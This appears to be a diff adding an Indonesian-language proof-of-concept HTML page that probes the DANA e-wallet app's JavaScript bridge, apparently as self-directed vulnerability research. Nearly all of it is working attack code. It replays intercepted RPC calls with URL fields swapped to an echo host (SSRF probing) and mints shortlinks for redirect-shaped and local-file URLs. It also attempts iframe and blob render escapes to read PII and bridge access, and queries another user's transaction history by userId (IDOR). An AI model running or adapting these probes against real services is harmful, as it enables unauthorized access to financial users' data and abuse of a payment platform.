@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v12</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%;font-weight:bold}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660;font-weight:normal}
+  button:disabled{background:#222;color:#666;border-color:#444}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+  input,textarea{width:96%;background:#000;color:#0ff;border:1px solid #660;padding:8px;font-size:12px;margin:2px 0 8px 0;font-family:monospace}
+  textarea{min-height:90px}
+</style>
+</head>
+<body>
+<div id="status">v12 boot...</div>
+<h3 style="color:#0ff">v12 - RENDER ESCAPE + REAL-INVOKE REPLAY + QR SCAN-BACK + SHORTLINK LADDER</h3>
+<p class="warn">SEBELUM RUN: siapkan di laptop QR code berisi URL website biasa (mis. buat di qr-code-generator). [2] bakal buka scanner — SCAN QR di layar laptop SAMPAI SELESAI. JANGAN scan QR pembayaran!</p>
+<p class="note">PHASE 1 (env) jalan sekarang. Isi 4 input di bawah, DISCONNECT HTTP Toolkit, baru tap RUN.</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+
+<p class="note">INPUT 1 - partnerId (max 3, pisah koma). Prioritas: partnerId dari merchant yang kamu BENERAN transaksi (kandidat partner "hidup" di paramcenter):</p>
+<input id="inp-pids" placeholder="contoh: 2166020242494729, 216620000035833566172">
+<p class="note">INPUT 2 - userId akun DANA kedua MILIKMU (family self-IDOR):</p>
+<input id="inp-uid2" placeholder="216610000xxxxxxxxxx">
+<p class="note">INPUT 3+4 (BARU - REPLAY RPC ASLI): saat HTTP Toolkit MASIH ON, buka mini-program apa pun di DANA, cari POST ke mgs.dana.id yang body JSON-nya ada "operationType". Copy nilai operationType ke INPUT 3; copy objek payload/requestData (atau seluruh body) ke INPUT 4. PILIH OP READ-ONLY (query/get/config/check) - JANGAN transfer/pay/refund!</p>
+<input id="inp-ot" placeholder="operationType, contoh: id.dana.xxx.yyy.query">
+<textarea id="inp-json" placeholder='payload JSON hasil intercept, contoh: {"partnerId":"...","queryType":"..."}'></textarea>
+
+<button id="btn2" onclick="runPhase2()">&#9654; RUN PHASE 2 (HTTP Toolkit must be OFF - QR laptop SIAP)</button>
+
+<h3>[1] netcheck</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] scanQr 60s - SCAN QR WEBSITE DI LAPTOP SAMPAI SELESAI</h3><pre id="p-2" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-2')">copy</button>
+<h3>[3] downloadFile resource-v12.html + fetch (content-type + simpan teks)</h3><pre id="p-3" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-3')">copy</button>
+<h3>[4] invoke kitchen control (m.dana.id) - baseline "system error"</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] invoke REPLAY VERBATIM (operationType+payload ASLI kamu)</h3><pre id="p-5" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-5')">copy</button>
+<h3>[6] invoke REPLAY URL-SWAP (field url di payload diganti echo)</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] shortlink a.m.dana.id retry (ditolak 003 di v11?)</h3><pre id="p-7" class="pending">pending</pre>
+<h3>[8] shortlink m.dana.id + query redirect-shaped</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] shortlink utk apFilePath resource (CHAIN retry)</h3><pre id="p-9" class="pending">pending</pre>
+<h3>[10] shortlink CONTROL m.dana.id path+query bebas (DI AKHIR - discriminator)</h3><pre id="p-10" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-10')">copy</button>
+<h3>[11] masking x input pids (oracle - cari partner "hidup")</h3><pre id="p-11" class="pending">pending</pre>
+<h3>[12] iframe SRCDOC render-escape (marker + bridge + pii read-back)</h3><pre id="p-12" class="pending">pending</pre>
+<h3>[13] iframe BLOB render-escape (marker + bridge + pii read-back)</h3><pre id="p-13" class="pending">pending</pre>
+<h3>[14] window.open(blobURL) - popup container?</h3><pre id="p-14" class="pending">pending</pre>
+<h3>[15] trx familyAccountMemberIds:[akun-2 kamu]</h3><pre id="p-15" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+<button class="mini" onclick="navBlob()" style="width:100%;padding:10px">[18] OPTIONAL SETELAH COPY: location = BLOB URL (lihat: render HTML? hitam? broken media? - back lalu laporkan)</button>
+<button class="mini" onclick="navData()" style="width:100%;padding:10px">[19] OPTIONAL: location = data:text/html (idem - back lalu laporkan)</button>
+<button class="mini" onclick="openResource()" style="width:100%;padding:10px">[20] OPTIONAL: buka resource page apFilePath (idem v11 [18] - screenshot bukti broken media)</button>
+<button class="mini" onclick="openShortlink()" style="width:100%;padding:10px">[21] OPTIONAL: buka shortlink hasil mint (lihat kemana arahnya)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  var LOG = [];
+  var running = false;
+  var attempt = 0;
+  var XENDIT_CID = '2019092596400267353417';
+  var OP_PARTNER = 'id.dana.minitunnel.partner.invoke';
+  var OP_MASKING = 'id.dana.minitunnel.user.info.masking';
+  var PAGES = 'https://rfypych.github.io/poc';
+  var ECHO = 'https://httpbin.org/anything?src=danav12';
+  var DANAURL = 'https://m.dana.id';
+  var TXN_OP = /(transfer|refund|withdraw|topup|cashier|sendmoney|createorder|paymentorder)/i;
+  var URL_KEYS = ['url','requesturl','apiurl','gatewayurl','serviceurl','endpoint','uri','requesturi','href','link','target','redirecturl','callbackurl','returnurl','next','redirect_uri','redirect'];
+  var lastAp = null;
+  var lastApText = null;
+  var lastShort = null;
+  var blobUrl = null;
+
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    var txt;
+    try { txt = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { txt = String(obj); }
+    if (txt && txt.length > 1800) txt = txt.slice(0,1800) + '...TRUNC';
+    el.textContent = txt;
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    var fired = false;
+    var go = function(){ if (!fired){ fired = true; cb(); } };
+    document.addEventListener('AlipayJSBridgeReady', go, false);
+    setTimeout(go, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||15000}); } }, timeoutMs || 15000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function getPids(){
+    var raw = (document.getElementById('inp-pids').value || '').trim();
+    if (!raw) return [];
+    return raw.split(/[\s,;]+/).filter(Boolean).slice(0,3);
+  }
+  function getUid2(){
+    return (document.getElementById('inp-uid2').value || '').trim();
+  }
+  function parseInvokeInput(){
+    var ot = (document.getElementById('inp-ot').value || '').trim();
+    var raw = (document.getElementById('inp-json').value || '').trim();
+    if (!ot && !raw) return null;
+    if (!raw) return {skipped:'payload JSON kosong'};
+    var obj;
+    try { obj = JSON.parse(raw); } catch(e){ return {parseError:String(e).slice(0,100)}; }
+    if (obj && typeof obj === 'object' && typeof obj.operationType === 'string' && obj.payload && typeof obj.payload === 'object'){
+      return {mode:'unwrapped', operationType:obj.operationType, payload:obj.payload};
+    }
+    if (!ot) return {skipped:'operationType kosong dan body tidak memuat operationType+payload'};
+    return {mode:'asIs', operationType:ot, payload:obj};
+  }
+  function swapUrls(payload){
+    var swapped = [];
+    function walk(o, path, depth){
+      if (!o || typeof o !== 'object' || depth > 4) return;
+      if (Array.isArray(o)) { for (var i=0;i<o.length;i++) walk(o[i], path+'['+i+']', depth+1); return; }
+      for (var k in o){
+        var v = o[k];
+        if (typeof v === 'string' && URL_KEYS.indexOf(k.toLowerCase()) !== -1 && /^https?:\/\//.test(v)){
+          o[k] = ECHO; swapped.push(path + '.' + k);
+        } else if (v && typeof v === 'object'){
+          walk(v, path + '.' + k, depth+1);
+        }
+      }
+    }
+    try { walk(payload, '$', 0); } catch(e){}
+    return {payload:payload, swappedKeys:swapped};
+  }
+  function kitchen(pid, method, target){
+    var bodyStr = JSON.stringify({poc:'v12', partnerId:pid, via:'dana-h5-minitunnel'});
+    return {
+      partnerId: pid,
+      httpMethod: method,
+      url: target, requestUrl: target, apiUrl: target, gatewayUrl: target, serviceUrl: target,
+      endpoint: target, uri: target, requestUri: target, href: target,
+      path: '/v12probe', requestPath: '/v12probe', apiName: '/v12probe',
+      interfaceName: 'v12probe', methodName: 'v12probe', operation: 'v12probe',
+      body: bodyStr, requestBody: bodyStr, content: bodyStr, data: bodyStr, params: bodyStr,
+      headers: {'X-PoC':'dana-v12'}, requestHeaders: {'X-PoC':'dana-v12'},
+      contentType: 'application/json', charset: 'utf-8',
+      requestId: 'v12-' + Date.now(), requestNo: 'v12', version: '1.0',
+      appId: 'null_online', source: 'h5', scene: 'poc'
+    };
+  }
+  function blobOf(){
+    if (blobUrl) return blobUrl;
+    if (!lastApText) return null;
+    try { blobUrl = URL.createObjectURL(new Blob([lastApText], {type:'text/html'})); } catch(e){ return null; }
+    return blobUrl;
+  }
+  function dataUrl(){
+    if (!lastApText) return null;
+    try { return 'data:text/html;base64,' + btoa(unescape(encodeURIComponent(lastApText))); } catch(e){ return null; }
+  }
+  async function iframeTest(mode){
+    if (!lastApText) return {skipped:'no resource text'};
+    var ifr = document.createElement('iframe');
+    ifr.style.cssText = 'width:12px;height:12px;opacity:0.05;position:fixed;bottom:0;left:0';
+    var out = {mode:mode};
+    try {
+      if (mode === 'srcdoc'){ ifr.srcdoc = lastApText; }
+      else {
+        var b = blobOf();
+        if (!b) return {skipped:'blob create failed'};
+        ifr.src = b;
+      }
+    } catch(e){ return {mode:mode, err:String(e).slice(0,80)}; }
+    document.body.appendChild(ifr);
+    await sleep(5000);
+    try {
+      var w = ifr.contentWindow;
+      out.marker = (w && w.__v12res) ? String(w.__v12res).slice(0,60) : null;
+      out.rendered = !!out.marker;
+      out.bridgeInIframe = !!(w && w.AlipayJSBridge);
+      if (w && w.__v12pii) out.piiHead = compact(w.__v12pii).slice(0,300);
+      try { out.iframeOrigin = w.location.origin; } catch(e){ out.iframeOrigin = 'inaccessible'; }
+    } catch(e){ out.crossOrigin = String(e).slice(0,80); }
+    try { document.body.removeChild(ifr); } catch(e){}
+    return out;
+  }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+  window.copyAll = function(){
+    var lines = [];
+    lines.push('v12 @ ' + location.href);
+    lines.push('log: ' + compact(LOG));
+    lines.push('inputs: ' + compact({pids:getPids(), uid2:getUid2(), ot:(document.getElementById('inp-ot').value||'').trim(), jsonLen:(document.getElementById('inp-json').value||'').length}));
+    for (var k = 0; k <= 15; k++) {
+      var id = 'p-' + k;
+      if (RESULTS[id] !== undefined) {
+        var s = compact(RESULTS[id]);
+        if (s.length > 2000) s = s.slice(0,2000) + '...CUT';
+        lines.push(id + ': ' + s);
+      }
+    }
+    var ta = document.createElement('textarea');
+    ta.value = lines.join('\n');
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+
+  function netcheck(){
+    var t0 = Date.now();
+    var rel = fetch('ping.txt?cb=' + Date.now(), {cache:'no-store'})
+      .then(function(r){ return {ok:true, http:r.status, ms:Date.now()-t0}; })
+      .catch(function(e){ return {ok:false, err:String(e).slice(0,60), ms:Date.now()-t0}; });
+    var abs = fetch(PAGES + '/ping.txt?cb=' + Date.now(), {mode:'no-cors', cache:'no-store'})
+      .then(function(){ return {noCors:true, ok:true}; })
+      .catch(function(e){ return {noCors:true, ok:false, err:String(e).slice(0,60)}; });
+    return Promise.all([rel, abs]).then(function(a){ return {relative:a[0], absoluteNoCors:a[1]}; });
+  }
+
+  window.navBlob = function(){
+    var u = blobOf();
+    if (!u) { alert('belum ada teks resource dari [3] - jalankan phase 2 dulu'); return; }
+    location.href = u;
+  };
+  window.navData = function(){
+    var u = dataUrl();
+    if (!u) { alert('belum ada teks resource dari [3]'); return; }
+    location.href = u;
+  };
+  window.openResource = function(){
+    if (!lastAp) { alert('belum ada apFilePath dari [3]'); return; }
+    location.href = lastAp;
+  };
+  window.openShortlink = function(){
+    if (!lastShort) { alert('belum ada shortUrl sukses'); return; }
+    location.href = lastShort;
+  };
+
+  window.runPhase2 = async function(){
+    if (running) return;
+    if (!window.AlipayJSBridge) { status('no bridge - cannot run phase 2'); return; }
+    running = true; attempt++;
+    var btn = document.getElementById('btn2');
+    btn.disabled = true;
+    var pids = getPids();
+    var uid2 = getUid2();
+    var inv = parseInvokeInput();
+    LOG.push({attempt:attempt, startedAt:new Date().toISOString(), pids:pids, uid2:uid2?'set':'empty', ot:inv&&inv.operationType?inv.operationType:(inv&&inv.parseError?'parse-error':(inv&&inv.skipped?'incomplete':'none'))});
+    try {
+      status('P2/' + attempt + ' [1] netcheck');
+      set('p-1', await netcheck());
+
+      status('P2/' + attempt + ' [2] scanQr - SCAN QR LAPTOP SAMPAI SELESAI');
+      set('p-2', await call('scanQr', {info:{codeConsumer:'native', scene:'v12poc'}}, 60000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [3] downloadFile resource-v12 + fetch');
+      var dl = await call('downloadFile', {url:PAGES + '/resource-v12.html', filePath:'v12res.html', downloadTaskId:9}, 25000);
+      var f = {noApPath:true};
+      var ap = dl && (dl.apFilePath || dl.filePath);
+      if (ap && typeof ap === 'string'){
+        lastAp = ap;
+        try {
+          var r = await fetch(ap, {cache:'no-store'});
+          var tx = await r.text();
+          lastApText = tx;
+          f = {fetched:true, http:r.status, contentType:(r.headers && r.headers.get) ? r.headers.get('content-type') : '?', bytes:tx.length, bodyHead:tx.slice(0,100), apFilePath:ap};
+        } catch(e){ f = {fetched:false, err:String(e).slice(0,80), apFilePath:ap}; }
+      }
+      if (!lastApText){
+        try {
+          var r2 = await fetch(PAGES + '/resource-v12.html', {cache:'no-store'});
+          var tx2 = await r2.text();
+          lastApText = tx2;
+          f.githubFallback = {http:r2.status, bytes:tx2.length};
+        } catch(e){ f.githubFallback = {err:String(e).slice(0,60)}; }
+      }
+      set('p-3', {call:dl, fetchAp:f});
+      await sleep(800);
+
+      status('P2/' + attempt + ' [4] invoke kitchen control');
+      set('p-4', await call('requestApi', {operationType:OP_PARTNER, payload:kitchen(XENDIT_CID, 'GET', DANAURL)}, 25000));
+      await sleep(800);
+
+      status('P2/' + attempt + ' [5] invoke REPLAY verbatim');
+      var replayPayload = null;
+      if (!inv){ set('p-5', 'skipped - tidak ada input operationType/payload', 'err'); }
+      else if (inv.parseError){ set('p-5', inv, 'err'); }
+      else if (inv.skipped){ set('p-5', inv, 'err'); }
+      else if (TXN_OP.test(inv.operationType)){ set('p-5', {skipped:'operationType berbau TRANSAKSI - dilewati demi keamanan', op:inv.operationType}, 'err'); }
+      else {
+        replayPayload = inv.payload;
+        set('p-5', await call('requestApi', {operationType:inv.operationType, payload:inv.payload}, 25000));
+      }
+      await sleep(800);
+
+      status('P2/' + attempt + ' [6] invoke REPLAY url-swap');
+      if (replayPayload){
+        var sw = swapUrls(JSON.parse(JSON.stringify(replayPayload)));
+        if (sw.swappedKeys.length){
+          set('p-6', {swappedKeys:sw.swappedKeys, result: await call('requestApi', {operationType:(inv && inv.operationType) || '', payload:sw.payload}, 25000)});
+        } else {
+          set('p-6', {skipped:'tidak ada field url/link di payload yang bisa di-swap'}, 'err');
+        }
+      } else { set('p-6', 'skipped - butuh replay [5] sukses parse', 'err'); }
+      await sleep(800);
+
+      status('P2/' + attempt + ' [7] shortlink a.m.dana.id retry');
+      var s1 = await call('createShortLink', {url:'https://a.m.dana.id/promo/generator-static-page/f-f-tebus-murah-1788773950034.html'}, 20000);
+      set('p-7', s1);
+      if (s1 && s1.shortUrl) lastShort = s1.shortUrl;
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [8] shortlink m.dana.id redirect-shaped query');
+      var s2 = await call('createShortLink', {url:'https://m.dana.id/v12fake?next=https://example.com&poc=1'}, 20000);
+      set('p-8', s2);
+      if (s2 && s2.shortUrl) lastShort = s2.shortUrl;
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [9] shortlink apFilePath (CHAIN retry)');
+      if (lastAp){
+        var s3 = await call('createShortLink', {url:lastAp}, 20000);
+        set('p-9', s3);
+        if (s3 && s3.shortUrl) lastShort = s3.shortUrl;
+      } else { set('p-9', 'skipped - no apFilePath', 'err'); }
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [10] shortlink CONTROL m.dana.id (discriminator)');
+      var s4 = await call('createShortLink', {url:'https://m.dana.id/v12ctl/path?poc=1&x=2'}, 20000);
+      set('p-10', s4);
+      if (s4 && s4.shortUrl) lastShort = s4.shortUrl;
+      await sleep(800);
+
+      status('P2/' + attempt + ' [11] masking x input pids');
+      if (pids.length){
+        var mres = {};
+        for (var i = 0; i < pids.length; i++){
+          mres[pids[i]] = await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:pids[i]}}, 20000);
+          await sleep(600);
+        }
+        set('p-11', mres);
+      } else {
+        set('p-11', 'skipped - no partnerId input', 'err');
+      }
+
+      status('P2/' + attempt + ' [12] iframe srcdoc render-escape');
+      set('p-12', await iframeTest('srcdoc'));
+      status('P2/' + attempt + ' [13] iframe blob render-escape');
+      set('p-13', await iframeTest('blob'));
+
+      status('P2/' + attempt + ' [14] window.open(blob)');
+      if (blobOf()){
+        var w = null;
+        try { w = window.open(blobOf(), '_blank'); } catch(e){ set('p-14', {err:String(e).slice(0,80)}); }
+        if (RESULTS['p-14'] === undefined){
+          set('p-14', {opened:!!w, note:'kalau muncul halaman baru dengan tombol COPY - tap COPY di halaman itu dan paste balik juga'});
+        }
+      } else { set('p-14', 'skipped - no blob', 'err'); }
+
+      status('P2/' + attempt + ' [15] trx family [uid2]');
+      if (uid2){
+        set('p-15', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false, familyAccountMemberIds:[uid2]}, 25000));
+      } else {
+        set('p-15', 'skipped - no second-account userId input', 'err');
+      }
+
+      LOG.push({attempt:attempt, finishedAt:new Date().toISOString(), note:'phase2 complete', lastAp:lastAp, lastShort:lastShort, resTextBytes:lastApText?lastApText.length:0});
+      status('DONE P2 attempt ' + attempt + ' - COPY ALL, lalu optional [18]-[21]');
+    } catch(e) {
+      status('phase2 error: ' + String(e).slice(0,60));
+    }
+    running = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#8635; RE-RUN PHASE 2 (jika busy/timeout massal, HTTP Toolkit masih nyala - disconnect + tap lagi)';
+  };
+
+  bridgeReady(function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)}, 'err');
+      status('NO BRIDGE (browser?) - open inside DANA container');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, href:location.href.slice(0,100)});
+    LOG.push({phase1Done:new Date().toISOString()});
+    status('PHASE 1 DONE - isi 4 input, siapkan QR laptop, DISCONNECT toolkit, RUN PHASE 2');
+  });
+})();
+</script>
+</body>
+</html>
